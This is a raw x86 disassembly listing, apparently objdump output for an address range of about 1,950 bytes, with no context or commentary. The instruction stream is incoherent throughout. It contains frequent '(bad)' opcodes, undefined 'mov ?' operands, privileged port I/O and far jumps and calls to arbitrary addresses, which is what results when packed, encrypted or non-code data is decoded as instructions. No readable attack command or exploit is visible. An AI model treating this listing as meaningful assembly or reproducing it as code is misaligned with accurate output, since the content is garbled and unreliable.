  402934:	or     esp,DWORD PTR [ebp-0x2b]
  402937:	aaa    
  402938:	es xchg edi,eax
  40293a:	notrack jmp DWORD PTR [ecx]
  40293d:	mov    ah,0x13
  40293f:	ins    DWORD PTR es:[edi],dx
  402940:	fldcw  WORD PTR [ecx]
  402942:	jns    0x40293a
  402944:	hlt    
  402945:	mov    al,ds:0x4386b1db
  40294a:	push   cs
  40294b:	out    dx,eax
  40294c:	ss pop esi
  40294e:	mov    bh,0x24
  402950:	cmp    bl,BYTE PTR [eax]
  402952:	setge  BYTE PTR [edi-0x64038998]
  402959:	outs   dx,BYTE PTR ds:[esi]
  40295a:	mov    ch,0x2b
  40295c:	and    al,0x3c
  40295e:	pop    es
  40295f:	std    
  402960:	test   BYTE PTR [eax],dh
  402962:	popa   
  402963:	sub    ecx,DWORD PTR [esi-0x681d848]
  402969:	dec    al
  40296b:	inc    ebp
  40296c:	call   0x537e:0x4cacc917
  402973:	scas   eax,DWORD PTR es:[edi]
  402974:	aaa    
  402975:	out    0x8a,eax
  402977:	or     al,0xea
  402979:	mov    bl,0xf6
  40297b:	xlat   BYTE PTR ds:[ebx]
  40297c:	and    eax,0xfe7ab6c5
  402981:	stos   DWORD PTR es:[edi],eax
  402982:	mov    esi,0x82550102
  402987:	not    DWORD PTR [ecx]
  402989:	sub    DWORD PTR [ecx-0x63],0x975799df
  402990:	sbb    edx,DWORD PTR [edx-0x22]
  402993:	ret    0xb601
  402996:	shr    BYTE PTR [ebx],0x97
  402999:	sar    BYTE PTR [edx+0x29],1
  40299c:	mov    esi,0xe5fb3e38
  4029a1:	jle    0x40297d
  4029a3:	jo     0x4029b0
  4029a5:	aad    0x86
  4029a7:	add    DWORD PTR [edi],eax
  4029a9:	adc    BYTE PTR [edi-0x690e70d2],bh
  4029af:	sbb    ecx,DWORD PTR [edx]
  4029b1:	mov    bl,0xe1
  4029b3:	xor    cl,BYTE PTR [ebp-0x36deb8ff]
  4029b9:	push   esp
  4029ba:	or     al,0x71
  4029bc:	lahf   
  4029bd:	lods   al,BYTE PTR ds:[esi]
  4029be:	mov    bl,ch
  4029c0:	aas    
  4029c1:	popa   
  4029c2:	stc    
  4029c3:	jmp    0x12302514
  4029c8:	sbb    BYTE PTR [ebp+0x79],ah
  4029cb:	sti    
  4029cc:	mov    bh,0x25
  4029ce:	cwde   
  4029cf:	sub    DWORD PTR [edx],ebx
  4029d1:	xchg   esp,eax
  4029d2:	cmp    eax,0x1be4fe95
  4029d7:	push   ebx
  4029d8:	and    dl,BYTE PTR [edx+0x25fe85f7]
  4029de:	cmp    BYTE PTR [ebx-0x31],0x4c
  4029e2:	js     0x4029a3
  4029e4:	lods   al,BYTE PTR ds:[esi]
  4029e5:	ret    
  4029e6:	pop    ebp
  4029e7:	mov    ds:0x6b2ed754,eax
  4029ec:	rol    DWORD PTR [edi],0x15
  4029ef:	rol    ch,1
  4029f1:	cmp    eax,0xb7b903a2
  4029f6:	push   edx
  4029f7:	cmp    BYTE PTR [eax-0x56cc2e59],bh
  4029fd:	mov    dh,0xd
  4029ff:	int3   
  402a00:	lds    ebx,FWORD PTR [edx-0x3dc83f6c]
  402a06:	mov    esp,0x574958f3
  402a0b:	fwait
  402a0c:	jl     0x4029d4
  402a0e:	sar    edx,cl
  402a10:	div    eax
  402a12:	in     al,dx
  402a13:	les    edi,FWORD PTR [ecx+0x7ca3e9e4]
  402a19:	test   eax,0xb98b1372
  402a1e:	hlt    
  402a1f:	repnz aad 0x47
  402a22:	fcmovnb st,st(5)
  402a24:	cld    
  402a25:	sub    al,0x51
  402a27:	pop    es
  402a28:	xor    cl,BYTE PTR [ebx-0x742cecd6]
  402a2e:	data16 jno 0x402aaa
  402a31:	inc    eax
  402a32:	scas   eax,DWORD PTR es:[edi]
  402a33:	ins    DWORD PTR es:[edi],dx
  402a34:	adc    al,0xfb
  402a36:	jmp    0xba6d9c3d
  402a3b:	js     0x402a84
  402a3d:	mov    ebp,0x2dc6d7c6
  402a42:	dec    edx
  402a43:	daa    
  402a44:	cs push 0x4a
  402a47:	retf   
  402a48:	je     0x402a56
  402a4a:	add    BYTE PTR [eax],0xbc
  402a4d:	adc    bl,ah
  402a4f:	adc    edx,DWORD PTR [ebx]
  402a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a52:	dec    edx
  402a53:	shl    BYTE PTR [ecx-0x35b1a062],0xa7
  402a5a:	jo     0x402a4e
  402a5c:	xchg   DWORD PTR [edi-0x50],ebx
  402a5f:	arpl   ax,si
  402a61:	jnp    0x402a8d
  402a63:	jmp    eax
  402a65:	fbstp  TBYTE PTR fs:[ecx]
  402a68:	(bad)  
  402a69:	sub    BYTE PTR [ebp+0x5a],dl
  402a6c:	push   ss
  402a6d:	push   ds
  402a6e:	or     eax,0x8ef01792
  402a73:	jp     0x402a04
  402a75:	xor    ecx,DWORD PTR [eax]
  402a77:	int3   
  402a78:	popf   
  402a79:	lods   eax,DWORD PTR ds:[esi]
  402a7a:	icebp  
  402a7b:	ja     0x402a76
  402a7d:	add    al,0x5e
  402a7f:	or     al,dh
  402a81:	bound  edx,QWORD PTR [edx]
  402a83:	(bad)  
  402a85:	retf   
  402a86:	ja     0x402aef
  402a88:	fisttp QWORD PTR [ebp+0x71]
  402a8b:	mov    ?,ecx
  402a8d:	mov    dh,0x64
  402a8f:	sahf   
  402a90:	xor    edx,DWORD PTR [ebx+0x5abe2252]
  402a96:	scas   eax,DWORD PTR es:[edi]
  402a97:	inc    eax
  402a98:	in     al,dx
  402a99:	push   edx
  402a9a:	jle    0x402a3b
  402a9c:	push   esi
  402a9d:	ret    
  402a9e:	adc    al,0x42
  402aa0:	inc    esp
  402aa1:	pop    edi
  402aa2:	add    al,0x7e
  402aa4:	out    dx,al
  402aa5:	imul   ecx,DWORD PTR [esi],0x6b
  402aa8:	add    BYTE PTR [ebx],al
  402aaa:	imul   eax,DWORD PTR [ecx-0x4a],0xc
  402aae:	and    ecx,DWORD PTR [edx]
  402ab0:	cs ins BYTE PTR es:[edi],dx
  402ab2:	mov    eax,0x392a3e9
  402ab7:	push   edx
  402ab8:	add    al,0xa5
  402aba:	and    eax,0x96626cf6
  402abf:	push   eax
  402ac0:	inc    ebp
  402ac1:	test   DWORD PTR [ebx+0xb],esi
  402ac4:	push   edx
  402ac5:	mov    DWORD PTR [esi+ecx*4],ebx
  402ac8:	dec    dh
  402aca:	add    DWORD PTR [edx+0x7d75f504],ebp
  402ad0:	(bad)  
  402ad1:	jns    0x402aca
  402ad3:	icebp  
  402ad4:	call   0x798a:0xd3b65ce3
  402adb:	jae    0x402aa6
  402add:	and    eax,0xc9dfb98f
  402ae2:	add    eax,0x55aadbca
  402ae7:	nop
  402ae8:	adc    eax,esp
  402aea:	xchg   ecx,eax
  402aeb:	xor    eax,0x52b192d2
  402af0:	daa    
  402af1:	dec    edx
  402af2:	not    DWORD PTR [eax]
  402af4:	xchg   ecx,edi
  402af6:	pop    eax
  402af7:	inc    eax
  402af8:	jmp    0x402b16
  402afa:	and    al,0x10
  402afc:	and    al,0xd6
  402afe:	add    al,0x45
  402b00:	outs   dx,DWORD PTR ds:[esi]
  402b01:	push   ebp
  402b02:	mov    DWORD PTR [eax+0x27],edx
  402b05:	push   cs
  402b06:	bound  ebx,QWORD PTR [edi+0x79c84adb]
  402b0c:	(bad)  
  402b0d:	popa   
  402b0e:	mov    edi,0x377c3a0d
  402b13:	addr16 pop edx
  402b15:	fistp  WORD PTR [edx]
  402b17:	jae    0x402a9f
  402b19:	ret    0xd142
  402b1c:	retf   0xe246
  402b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b20:	outs   dx,DWORD PTR ds:[esi]
  402b21:	pop    es
  402b22:	mov    bh,0x5e
  402b24:	add    DWORD PTR gs:[edi+ebp*1],esp
  402b28:	pop    esp
  402b29:	mov    bl,0x93
  402b2b:	stos   DWORD PTR es:[edi],eax
  402b2c:	pop    edi
  402b2d:	in     al,0x99
  402b2f:	into   
  402b30:	mov    al,0x93
  402b32:	test   al,0x41
  402b34:	mov    ecx,0x9efcec58
  402b39:	lods   eax,DWORD PTR ds:[esi]
  402b3a:	neg    BYTE PTR [eax]
  402b3c:	sbb    ch,BYTE PTR [esp+edx*2+0x47]
  402b40:	stc    
  402b41:	(bad)  [ecx]
  402b43:	and    al,0xcc
  402b45:	enter  0xa9ef,0x88
  402b49:	loop   0x402b0c
  402b4b:	mov    ah,0xec
  402b4d:	jno    0x402b75
  402b4f:	mov    eax,0x2b3c2f6
  402b54:	cdq    
  402b55:	xchg   ebp,eax
  402b56:	sub    al,0x24
  402b58:	cmp    DWORD PTR [edi+0x1f],edx
  402b5b:	fcomp  st(5)
  402b5d:	dec    ecx
  402b5e:	inc    ebp
  402b5f:	inc    eax
  402b60:	retf   0x1cb2
  402b63:	xchg   esp,eax
  402b64:	xchg   edi,eax
  402b65:	aas    
  402b66:	test   eax,0x463b422c
  402b6b:	add    BYTE PTR [edx+eiz*4-0x2769fc8c],cl
  402b72:	int    0xa
  402b74:	mov    ebx,0x95e747c8
  402b79:	dec    DWORD PTR [edx-0x682de43]
  402b7f:	jp     0x402b4c
  402b81:	(bad)  
  402b83:	dec    ecx
  402b84:	dec    ebx
  402b85:	xchg   ebp,eax
  402b86:	leave  
  402b87:	cmp    dh,0x30
  402b8a:	xchg   esi,eax
  402b8b:	add    ecx,ebx
  402b8d:	ret    0xbdf2
  402b90:	pop    esi
  402b91:	and    bl,BYTE PTR [esi-0x778ce194]
  402b97:	sub    ebp,DWORD PTR [esi]
  402b99:	xchg   esi,eax
  402b9a:	mov    esp,edx
  402b9c:	lods   eax,DWORD PTR ds:[esi]
  402b9d:	cli    
  402b9e:	xchg   DWORD PTR [edi+0x7],ebx
  402ba1:	dec    esi
  402ba2:	mov    ?,WORD PTR [ebx-0x1c]
  402ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ba6:	and    eax,0x452a0cba
  402bab:	out    0xa4,al
  402bad:	sahf   
  402bae:	je     0x402be4
  402bb0:	mov    ebx,0x3ddb0006
  402bb5:	dec    eax
  402bb6:	push   eax
  402bb7:	test   al,0xf7
  402bb9:	aas    
  402bba:	adc    al,ah
  402bbc:	inc    ecx
  402bbd:	ja     0x402c1f
  402bbf:	and    ecx,DWORD PTR ds:0x29bf97e9
  402bc5:	gs out dx,al
  402bc7:	sbb    eax,0xa5316319
  402bcc:	xlat   BYTE PTR ds:[ebx]
  402bcd:	add    eax,0x761cacbc
  402bd2:	sub    al,0xd5
  402bd4:	cmp    BYTE PTR [ebp-0x56dc8d86],bh
  402bda:	mov    eax,ds:0xab37c333
  402bdf:	jb     0x402c0a
  402be1:	aaa    
  402be2:	fsub   QWORD PTR [ebp+0x56]
  402be5:	fcom   QWORD PTR ds:0xa5ee3e5a
  402beb:	mov    esi,0x54185906
  402bf0:	jb     0x402c2e
  402bf2:	mov    edi,DWORD PTR ds:0x58d8b9bd
  402bf8:	lea    esi,[edx+0x4fdc67c4]
  402bfe:	aaa    
  402bff:	call   0x119618d6
  402c04:	sub    bl,BYTE PTR [edx-0x48]
  402c07:	and    ecx,DWORD PTR [esi-0x80]
  402c0a:	sbb    BYTE PTR [ebp+0x27],cl
  402c0d:	add    eax,0xc02aa145
  402c12:	xchg   ebp,eax
  402c13:	sti    
  402c14:	adc    BYTE PTR [edx-0x25],0xb0
  402c18:	popa   
  402c19:	hlt    
  402c1a:	fs add dl,ah
  402c1d:	icebp  
  402c1e:	sub    eax,0xaa4793b6
  402c23:	sbb    al,0xb3
  402c25:	dec    esp
  402c26:	outs   dx,DWORD PTR ds:[esi]
  402c27:	jmp    0xe82a:0xd8172063
  402c2e:	ret    
  402c2f:	cmc    
  402c30:	test   DWORD PTR [esi+0x1a302c5],edx
  402c36:	add    edx,DWORD PTR [ecx-0x60b291bf]
  402c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c3d:	xchg   esp,eax
  402c3e:	adc    ah,BYTE PTR [ecx+0x134e2f38]
  402c44:	repz dec ebp
  402c46:	jg     0x402c22
  402c48:	cmp    BYTE PTR [ecx-0x6416683a],0xb9
  402c4f:	cmp    al,0x7e
  402c51:	mov    eax,0xa6c686c
  402c56:	in     eax,dx
  402c57:	add    dh,BYTE PTR ds:0x91203e88
  402c5d:	aaa    
  402c5e:	scas   al,BYTE PTR es:[edi]
  402c5f:	lea    edi,ds:0x19bbb74e
  402c65:	sbb    eax,0xdb1854cf
  402c6a:	je     0x402c4f
  402c6c:	mov    bl,0xdd
  402c6e:	(bad)  
  402c6f:	and    eax,0x74c05c7a
  402c74:	or     bl,BYTE PTR ds:0x4f2645ce
  402c7a:	or     DWORD PTR [edi],esi
  402c7c:	leave  
  402c7d:	dec    edi
  402c7e:	jns    0x402ca0
  402c80:	mov    DWORD PTR [edx+0x49],edx
  402c83:	xchg   DWORD PTR ds:0xecf96852,edi
  402c89:	xor    BYTE PTR [esi],bl
  402c8b:	and    eax,0x81f422b4
  402c90:	imul   ebx,DWORD PTR ds:0x626f4df0,0x4c1a1750
  402c9a:	repnz ds inc ecx
  402c9d:	or     al,bl
  402c9f:	mov    ch,0xea
  402ca1:	xchg   ebx,eax
  402ca2:	push   edx
  402ca3:	aad    0x1d
  402ca5:	cwde   
  402ca6:	mov    edx,0x6a6833f3
  402cab:	mov    ch,0x52
  402cad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cae:	push   0xffffffaa
  402cb0:	dec    esp
  402cb1:	repz mov esp,0xa16a9d7b
  402cb7:	retf   0xeb39
  402cba:	mov    ah,0xa0
  402cbc:	mov    bl,0x3f
  402cbe:	mov    eax,0xbe17bdd5
  402cc3:	js     0x402cf0
  402cc5:	imul   edx,DWORD PTR [ecx+eax*4-0x324f355c],0x72ff15e7
  402cd0:	xchg   edx,eax
  402cd1:	xor    eax,edx
  402cd3:	dec    esp
  402cd4:	or     al,0xd6
  402cd6:	mov    al,ds:0xfbf42560
  402cdb:	jno    0x402cd4
  402cdd:	jp     0x402cc5
  402cdf:	or     al,0xec
  402ce1:	push   eax
  402ce2:	mov    BYTE PTR [edx],al
  402ce4:	adc    DWORD PTR [ebx],edx
  402ce6:	in     eax,0x7b
  402ce8:	jnp    0x402cd7
  402cea:	lea    edi,[edx]
  402cec:	loop   0x402ce7
  402cee:	sar    dh,0xfc
  402cf1:	add    BYTE PTR [eax+0x40da8269],al
  402cf7:	pop    edi
  402cf8:	scas   al,BYTE PTR es:[edi]
  402cf9:	sti    
  402cfa:	pop    eax
  402cfb:	retf   
  402cfc:	xchg   esp,eax
  402cfd:	test   al,0xf5
  402cff:	daa    
  402d00:	xor    eax,0xff4fd710
  402d05:	ins    DWORD PTR es:[edi],dx
  402d06:	add    ebx,ebp
  402d08:	icebp  
  402d09:	jge    0x402d68
  402d0b:	stc    
  402d0c:	adc    al,0xab
  402d0e:	xor    cl,BYTE PTR ds:0xed3225f4
  402d14:	push   cs
  402d15:	out    0xfd,eax
  402d17:	mov    al,0x53
  402d19:	ds in  al,0x49
  402d1c:	mov    ch,0xb9
  402d1e:	mov    esp,0xf0fabbf8
  402d23:	and    bh,dl
  402d25:	jmp    0x5e22fa54
  402d2a:	mov    ebp,0x27abe22e
  402d2f:	add    BYTE PTR [ebx-0x209c7263],0xda
  402d36:	retf   0xf9d9
  402d39:	in     al,dx
  402d3a:	in     al,0x11
  402d3c:	ds test al,0x71
  402d3f:	push   DWORD PTR [ebp-0x41]
  402d42:	sub    eax,0xc587d485
  402d47:	jmp    0x402d7e
  402d49:	add    al,0xef
  402d4b:	mov    esp,ds
  402d4d:	inc    edi
  402d4e:	and    BYTE PTR [ebp+0x6d95af95],dh
  402d54:	mov    ds:0xfaf4ea7c,eax
  402d59:	sub    DWORD PTR [ebp-0xf18c960],eax
  402d5f:	inc    edx
  402d60:	cdq    
  402d61:	mov    esp,0xac483239
  402d66:	cli    
  402d67:	pop    eax
  402d68:	xor    dh,bl
  402d6a:	pushf  
  402d6b:	inc    ecx
  402d6c:	ins    BYTE PTR es:[edi],dx
  402d6d:	or     ecx,esi
  402d6f:	hlt    
  402d70:	lods   eax,DWORD PTR ds:[esi]
  402d71:	outs   dx,BYTE PTR ds:[esi]
  402d72:	mov    dl,BYTE PTR [ebx-0x17f84506]
  402d78:	inc    ecx
  402d79:	ja     0x402d77
  402d7b:	and    eax,0x68e730c9
  402d80:	jno    0x402d8c
  402d82:	or     ebp,DWORD PTR [ebx]
  402d84:	aaa    
  402d85:	mov    bh,0x5d
  402d87:	lods   al,BYTE PTR ds:[esi]
  402d88:	and    ecx,DWORD PTR [ebx]
  402d8a:	or     al,0xc5
  402d8c:	pusha  
  402d8d:	retf   
  402d8e:	xchg   ebp,eax
  402d8f:	jnp    0x402d8c
  402d91:	push   edx
  402d92:	mov    cl,BYTE PTR gs:[esi-0x7c25e684]
  402d99:	ja     0x402dc0
  402d9b:	stc    
  402d9c:	out    dx,al
  402d9d:	add    eax,0xd072493f
  402da2:	(bad)  
  402da3:	fsubp  st(1),st
  402da5:	inc    eax
  402da6:	addr16 mov ah,0xf8
  402da9:	cmp    eax,0x6080b6d2
  402dae:	lods   al,BYTE PTR ds:[esi]
  402daf:	or     al,0x3e
  402db1:	call   0x3c3d91c4
  402db6:	or     edx,eax
  402db8:	out    0x1a,al
  402dba:	adc    ebp,DWORD PTR [ecx]
  402dbc:	sub    eax,0x43919119
  402dc1:	adc    edx,0xb0ba8b68
  402dc7:	into   
  402dc8:	pop    ebp
  402dc9:	test   DWORD PTR [ebp-0x2],0xab30015c
  402dd0:	rcr    DWORD PTR [edi+0x43],cl
  402dd3:	mov    fs,WORD PTR [ebx+0x5c932cc]
  402dd9:	or     al,0x92
  402ddb:	rol    DWORD PTR [ebp+0x14],0x76
  402ddf:	loope  0x402d9c
  402de1:	retf   0x655e
  402de4:	ret    0x2727
  402de7:	jmp    FWORD PTR ds:0x25604d40
  402ded:	sbb    BYTE PTR [edx+ebx*2+0x581cd1e4],cl
  402df4:	cli    
  402df5:	jl     0x402e6c
  402df7:	imul   edi,eax,0xffffffb5
  402dfa:	rol    BYTE PTR [edi],1
  402dfc:	adc    cl,0x65
  402dff:	inc    ecx
  402e00:	push   ebp
  402e01:	mov    ah,0xd1
  402e03:	test   al,0x1
  402e05:	pop    ss
  402e06:	jp     0x402e2f
  402e08:	das    
  402e09:	jge    0x402de8
  402e0b:	loop   0x402dcd
  402e0d:	mov    ebp,0xd2a7bd6a
  402e12:	bound  ebx,QWORD PTR [eax-0x3e]
  402e15:	scas   al,BYTE PTR es:[edi]
  402e16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e17:	xchg   ebx,eax
  402e18:	sub    eax,0x2adfcb0c
  402e1d:	or     DWORD PTR [edx-0x415b405d],edi
  402e23:	in     al,dx
  402e24:	pop    ecx
  402e25:	mov    bl,BYTE PTR [esi+esi*4]
  402e28:	pop    eax
  402e29:	sahf   
  402e2a:	jp     0x402dca
  402e2c:	cwde   
  402e2d:	xchg   DWORD PTR [esi],ecx
  402e2f:	xchg   edx,eax
  402e30:	sub    edi,edi
  402e32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e33:	pusha  
  402e34:	scas   eax,DWORD PTR es:[edi]
  402e35:	leave  
  402e36:	pop    eax
  402e37:	js     0x402ddf
  402e39:	xlat   BYTE PTR ds:[ebx]
  402e3a:	inc    esi
  402e3b:	in     eax,dx
  402e3c:	into   
  402e3d:	add    BYTE PTR [edx+0x5b39e99b],dh
  402e43:	dec    ebp
  402e44:	sbb    BYTE PTR [edi-0xf82ad91],cl
  402e4a:	test   BYTE PTR [ecx+esi*8+0x224d0f84],dl
  402e51:	bound  ebp,QWORD PTR [ecx]
  402e53:	int3   
  402e54:	mov    ch,0xa
  402e56:	cli    
  402e57:	ret    
  402e58:	ss out 0x46,eax
  402e5b:	sub    BYTE PTR [ecx+0x44],ch
  402e5e:	rep stos BYTE PTR es:[edi],al
  402e60:	mov    BYTE PTR [esi+0x46],ch
  402e63:	dec    ebx
  402e64:	lods   al,BYTE PTR ds:[esi]
  402e65:	adc    DWORD PTR [esi+ebp*2+0x2f39dc31],0x9d7a4079
  402e70:	and    eax,0x4364210
  402e75:	sbb    BYTE PTR [edi+0x4af49957],dl
  402e7b:	dec    eax
  402e7c:	push   ss
  402e7d:	cmp    ebx,ebp
  402e7f:	mov    esi,0x9ecfe253
  402e84:	or     eax,0xbee52ea5
  402e89:	fmul   QWORD PTR [ebx-0x291e2dd8]
  402e8f:	das    
  402e90:	mov    ebp,0x86107987
  402e95:	pop    ds
  402e96:	shl    DWORD PTR [edx],0x75
  402e99:	mov    dh,0x7d
  402e9b:	lods   al,BYTE PTR ds:[esi]
  402e9c:	adc    dh,cl
  402e9e:	dec    ebx
  402e9f:	push   edx
  402ea0:	cmp    cl,dh
  402ea2:	mov    WORD PTR [ebp+0x136aec85],ss
  402ea8:	cld    
  402ea9:	test   eax,0x9f391d5a
  402eae:	shl    DWORD PTR [eax],cl
  402eb0:	div    BYTE PTR [ecx]
  402eb2:	aas    
  402eb3:	out    dx,al
  402eb4:	or     BYTE PTR cs:[edi-0x55da3998],dh
  402ebb:	inc    edi
  402ebc:	xchg   edx,eax
  402ebd:	cld    
  402ebe:	pushf  
  402ebf:	push   ebx
  402ec0:	dec    ebx
  402ec1:	cmp    BYTE PTR [ebx-0x7f],dh
  402ec4:	shl    DWORD PTR [ebp+0x3a],1
  402ec7:	test   DWORD PTR [eax+0x56],eax
  402eca:	adc    ch,bh
  402ecc:	mov    bl,0x2f
  402ece:	hlt    
  402ecf:	or     ah,cl
  402ed1:	test   eax,0xadc0b315
  402ed6:	xchg   ecx,eax
  402ed7:	dec    ebp
  402ed8:	pop    ebx
  402ed9:	stos   DWORD PTR es:[edi],eax
  402eda:	and    eax,0x4cfefb47
  402edf:	add    al,ah
  402ee1:	pop    edi
  402ee2:	cmc    
  402ee3:	repz mov eax,ds:0x70804598
  402ee9:	xchg   ecx,eax
  402eea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402eeb:	inc    ebp
  402eec:	(bad)  
  402eee:	ret    0xec13
  402ef1:	or     BYTE PTR [edx+0x1eb96a82],bl
  402ef7:	int    0xeb
  402ef9:	xchg   ecx,eax
  402efa:	or     eax,0x49ff5edc
  402eff:	mov    esi,0x2441d3de
  402f04:	sar    DWORD PTR [ecx+0x5e3beace],1
  402f0a:	sbb    cl,dh
  402f0c:	fisubr WORD PTR [edi-0x69]
  402f0f:	mov    ebp,0x68898af3
  402f14:	div    DWORD PTR [eax+ebp*8-0x7]
  402f18:	sub    eax,0x4fcc6ac7
  402f1d:	(bad)  
  402f1e:	and    DWORD PTR [esi-0x54],esp
  402f21:	mov    BYTE PTR [ebx-0x1b2a32da],dl
  402f27:	add    DWORD PTR [ebx-0x4edb7aae],ebx
  402f2d:	call   0x6080:0xb3b5267a
  402f34:	out    dx,al
  402f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f36:	lods   eax,DWORD PTR ds:[esi]
  402f37:	je     0x402f20
  402f39:	jmp    0x402f83
  402f3b:	add    dh,BYTE PTR [esi]
  402f3d:	inc    ebx
  402f3e:	je     0x402fb6
  402f40:	(bad)  
  402f41:	mov    DWORD PTR [ebx],esp
  402f43:	mov    esi,0x7be112
  402f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f49:	ror    BYTE PTR [esi+ecx*8-0x5bcfcdba],cl
  402f50:	xor    eax,0xebbabb57
  402f55:	xchg   edx,eax
  402f56:	addr16 inc esi
  402f58:	pop    esi
  402f59:	sub    ebx,ebp
  402f5b:	daa    
  402f5c:	fcmovb st,st(3)
  402f5e:	inc    esp
  402f5f:	ror    DWORD PTR [edx],1
  402f61:	pop    ds
  402f62:	xor    cl,BYTE PTR ds:[ebp+0x4096fd4d]
  402f69:	rol    DWORD PTR [edi],1
  402f6b:	adc    DWORD PTR [ebx],edx
  402f6d:	stos   BYTE PTR es:[edi],al
  402f6e:	fimul  WORD PTR [ebx]
  402f70:	retf   
  402f71:	jns    0x402fb7
  402f73:	pop    edi
  402f74:	mov    DWORD PTR [ebp+0xe1c6c16],esi
  402f7a:	cmp    BYTE PTR [ecx],0x38
  402f7d:	sbb    bh,dl
  402f7f:	cwde   
  402f80:	add    eax,ebp
  402f82:	push   cs
  402f83:	stc    
  402f84:	add    al,0x1
  402f86:	xlat   BYTE PTR ds:[ebx]
  402f87:	inc    esp
  402f88:	pop    ebp
  402f89:	or     BYTE PTR [eax],al
  402f8b:	and    DWORD PTR [eax+0x6777dc5d],edi
  402f91:	es jbe 0x402f34
  402f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f95:	and    cl,BYTE PTR [ecx]
  402f97:	pusha  
  402f98:	xchg   edx,eax
  402f99:	inc    ebx
  402f9a:	jb     0x402fad
  402f9c:	pusha  
  402f9d:	shl    DWORD PTR [ebp-0x2383eb19],1
  402fa3:	cmp    eax,0x144d0dc5
  402fa8:	xchg   DWORD PTR [ebx-0x601058a8],esp
  402fae:	xchg   edx,eax
  402faf:	lds    ecx,FWORD PTR [ecx+ebp*2]
  402fb2:	retf   0xea4c
  402fb5:	mov    al,0xe
  402fb7:	fld    QWORD PTR [eax+0x60]
  402fba:	jae    0x402f66
  402fbc:	inc    esi
  402fbd:	sbb    BYTE PTR [ebx],0xd4
  402fc0:	mul    ebx
  402fc2:	xchg   DWORD PTR [edi],edi
  402fc4:	shr    DWORD PTR [esi-0xe],0xa9
  402fc8:	shl    BYTE PTR [ebx],0x3f
  402fcb:	pop    ss
  402fcc:	pushf  
  402fcd:	shr    DWORD PTR [ecx+edx*8],1
  402fd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fd1:	sub    esp,ebp
  402fd3:	mov    bl,0x78
  402fd5:	sbb    al,bh
  402fd7:	adc    edx,DWORD PTR [edx+0x6311746b]
  402fdd:	imul   esp,DWORD PTR [esp+edi*8-0x48],0xffffffce
  402fe2:	fs xchg ebx,eax
  402fe4:	cmp    DWORD PTR [ebx],0xffffffca
  402fe7:	mov    eax,DWORD PTR [ebx+0xc]
  402fea:	mov    ds:0xd2a0ae8f,eax
  402fef:	nop
  402ff0:	or     BYTE PTR [ebx-0x22],cl
  402ff3:	pop    esp
  402ff4:	out    dx,eax
  402ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ff6:	call   0x29d387c3
  402ffb:	mov    al,0xaf
  402ffd:	mov    ch,0xac
  402fff:	and    BYTE PTR [eax+0x7b],dh
  403002:	xchg   esi,eax
  403003:	out    dx,eax
  403004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403005:	mov    al,0x50
  403007:	push   esi
  403008:	jmp    0x2309:0x1acb6b60
  40300f:	inc    ebp
  403010:	and    eax,0x834e5d81
  403015:	or     ecx,DWORD PTR [ebp+0x68]
  403018:	jle    0x402ff1
  40301a:	ds hlt 
  40301c:	(bad)  
  40301e:	rol    ch,0xab
  403021:	stos   BYTE PTR es:[edi],al
  403022:	rcl    DWORD PTR ds:0xd15d682f,1
  403028:	into   
  403029:	jg     0x403058
  40302b:	sub    ebp,DWORD PTR [edx+0x4]
  40302e:	ror    bh,0x3e
  403031:	test   BYTE PTR gs:[ebx+0x2f0ac9f6],al
  403038:	nop
  403039:	and    BYTE PTR [ebp-0x35b8c80a],cl
  40303f:	add    al,0xac
  403041:	inc    ecx
  403042:	fldcw  WORD PTR [edx+edx*8+0xe]
  403046:	repz adc cl,0xed
  40304a:	outs   dx,DWORD PTR ds:[esi]
  40304b:	in     eax,0x3c
  40304d:	cmp    DWORD PTR ss:[ebx-0x1fc5b5c5],esp
  403054:	ret    0x8fd4
  403057:	dec    edx
  403058:	and    bl,BYTE PTR [ebp-0x492fdc13]
  40305e:	daa    
  40305f:	cli    
  403060:	push   eax
  403061:	adc    eax,0xd22e8bd4
  403066:	push   ebx
  403067:	scas   al,BYTE PTR es:[edi]
  403068:	dec    ebx
  403069:	js     0x4030ea
  40306b:	mov    eax,ds:0x54af759b
  403070:	xchg   ecx,eax
  403071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403072:	sahf   
  403073:	cmp    al,0x18
  403075:	cmp    bh,dl
  403077:	add    eax,0xdf8f5045
  40307c:	paddusb mm7,QWORD PTR [ecx+ecx*8-0x10]
  403081:	or     DWORD PTR [ebp+0x2a7e6b18],esp
  403087:	fnstcw WORD PTR [eax]
  403089:	test   al,0xd5
  40308b:	shl    DWORD PTR [edi+0x1d],1
  40308e:	enter  0x68a4,0xcf
  403092:	push   es
  403093:	adc    al,0x11
  403095:	adc    al,0x7
  403097:	jge    0x40303c
  403099:	mov    esp,0x362c6dfa
  40309e:	push   edi
  40309f:	lahf   
  4030a0:	push   edx
  4030a1:	les    esp,FWORD PTR [ebp+0xb8ddd4c]
  4030a7:	mov    cl,0x6a
  4030a9:	add    eax,0xfb54e3c2
  4030ae:	push   es
  4030af:	push   ds
  4030b0:	cmc    
  4030b1:	ret    0x85a5
  4030b4:	fnstenv [esi+0x70762e1a]
  4030ba:	add    ebx,eax
  4030bc:	mov    dl,0x7b
  4030be:	clc    
  4030bf:	mov    ds:0xf8b78da3,al
  4030c4:	and    dh,BYTE PTR [esi]
  4030c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030c7:	add    BYTE PTR [ebp+ebp*4-0x318b4bba],ch
  4030ce:	xchg   edx,eax
  4030cf:	pop    ebx
  4030d0:	pop    eax
  4030d1:	and    DWORD PTR [eax],eax
  4030d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
